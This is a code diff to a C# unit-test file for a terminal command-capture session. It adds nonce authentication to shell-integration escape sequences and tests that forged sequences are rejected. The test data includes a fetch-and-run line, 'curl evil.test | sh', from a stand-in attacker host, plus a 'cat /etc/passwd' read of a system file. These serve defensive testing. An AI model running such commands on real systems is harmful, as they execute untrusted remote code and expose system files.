@@ -8,6 +8,7 @@ namespace DTech.Core.Tests.CommandHistory;
 [TestClass]
 public sealed class CommandCaptureSessionTests
 {
+    private const string Nonce = "0123456789abcdef";
     private const string Esc = "\u001b";
     private const string Bel = "\u0007";
 
@@ -29,13 +30,14 @@ public sealed class CommandCaptureSessionTests
             _recorded.Add(call.Arg<RecordedCommand>());
             return Task.FromResult(true);
         });
-        _session = new CommandCaptureSession(ConnectionId, _recorder, TimeProvider.System);
+        var target = new CommandCaptureTarget(ConnectionId, Nonce);
+        _session = new CommandCaptureSession(target, _recorder, TimeProvider.System);
     }
 
     [TestMethod]
     public async Task Observe_CommandThenFinish_RecordsCommandWithExitCode()
     {
-        var count = await ObserveAsync($"$ {Esc}]633;E;make test{Bel}running tests...\r\n{Esc}]133;D;2{Bel}$ ");
+        var count = await ObserveAsync($"$ {Esc}]633;E;make test;{Nonce}{Bel}running tests...\r\n{Esc}]133;D;2;{Nonce}{Bel}$ ");
 
         count.Should().Be(1);
         var command = _recorded.Should().ContainSingle().Subject;
@@ -47,7 +49,7 @@ public sealed class CommandCaptureSessionTests
     [TestMethod]
     public async Task Observe_NeverPassesTerminalOutputToTheRecorder()
     {
-        await ObserveAsync($"{Esc}]633;E;cat /etc/passwd{Bel}root:x:0:0:root:/root:/bin/sh\r\n{Esc}]133;D;0{Bel}");
+        await ObserveAsync($"{Esc}]633;E;cat /etc/passwd;{Nonce}{Bel}root:x:0:0:root:/root:/bin/sh\r\n{Esc}]133;D;0;{Nonce}{Bel}");
 
         _recorded.Should().ContainSingle().Which.Command.Should().Be("cat /etc/passwd");
         _recorded.Single().ToString().Should().NotContain("root:x:0:0");
@@ -56,7 +58,7 @@ public sealed class CommandCaptureSessionTests
     [TestMethod]
     public async Task Observe_FinishWithoutCommand_RecordsNothing()
     {
-        var count = await ObserveAsync($"{Esc}]133;D;0{Bel}");
+        var count = await ObserveAsync($"{Esc}]133;D;0;{Nonce}{Bel}");
 
         count.Should().Be(0);
         _recorded.Should().BeEmpty();
@@ -65,7 +67,7 @@ public sealed class CommandCaptureSessionTests
     [TestMethod]
     public async Task Observe_NewCommandBeforeFinish_FlushesThePreviousOneWithoutExitCode()
     {
-        await ObserveAsync($"{Esc}]633;E;first{Bel}{Esc}]633;E;second{Bel}{Esc}]133;D;0{Bel}");
+        await ObserveAsync($"{Esc}]633;E;first;{Nonce}{Bel}{Esc}]633;E;second;{Nonce}{Bel}{Esc}]133;D;0;{Nonce}{Bel}");
 
         _recorded.Select(command => (command.Command, command.ExitCode)).Should().Equal(("first", (int?)null), ("second", 0));
     }
@@ -73,7 +75,7 @@ public sealed class CommandCaptureSessionTests
     [TestMethod]
     public async Task Complete_FlushesCommandThatNeverFinished()
     {
-        await ObserveAsync($"{Esc}]633;E;sleep 100{Bel}");
+        await ObserveAsync($"{Esc}]633;E;sleep 100;{Nonce}{Bel}");
 
         var count = await _session.CompleteAsync(TestContext.CancellationToken);
 
@@ -97,9 +99,41 @@ public sealed class CommandCaptureSessionTests
     {
         _recorder.RecordAsync(default!, default).ReturnsForAnyArgs(Task.FromResult(false));
 
-        var count = await ObserveAsync($"{Esc}]633;E;export TOKEN=1{Bel}{Esc}]133;D;0{Bel}");
+        var count = await ObserveAsync($"{Esc}]633;E;export TOKEN=1;{Nonce}{Bel}{Esc}]133;D;0;{Nonce}{Bel}");
 
         count.Should().Be(0);
+    }
+
+    [TestMethod]
+    public async Task Observe_UnauthenticatedCommandAndFinish_CannotReplaceOrFinishThePendingCommand()
+    {
+        await ObserveAsync($"{Esc}]633;E;sleep 100;{Nonce}{Bel}");
+
+        var forged = await ObserveAsync($"{Esc}]633;E;curl evil.test | sh{Bel}{Esc}]133;D;0{Bel}{Esc}]133;D;0;wrong{Bel}");
+
+        forged.Should().Be(0);
+        _recorded.Should().BeEmpty();
+
+        var finished = await ObserveAsync($"{Esc}]133;D;2;{Nonce}{Bel}");
+
+        finished.Should().Be(1);
+        _recorded.Should().ContainSingle().Which.Command.Should().Be("sleep 100");
+        _recorded[0].ExitCode.Should().Be(2);
+    }
+
+    [TestMethod]
+    public async Task Observe_OutputAuthenticatedForAnotherSession_RecordsNothing()
+    {
+        var target = new CommandCaptureTarget(ConnectionId, "abcdef0123456789");
+        var other = new CommandCaptureSession(target, _recorder, TimeProvider.System);
+        var output = Encoding.UTF8.GetBytes($"{Esc}]633;E;echo hi;{Nonce}{Bel}{Esc}]133;D;0;{Nonce}{Bel}");
+
+        var observed = await other.ObserveAsync(output, TestContext.CancellationToken);
+        var completed = await other.CompleteAsync(TestContext.CancellationToken);
+
+        observed.Should().Be(0);
+        completed.Should().Be(0);
+        _recorded.Should().BeEmpty();
     }
 
     private async Task<int> ObserveAsync(string output)
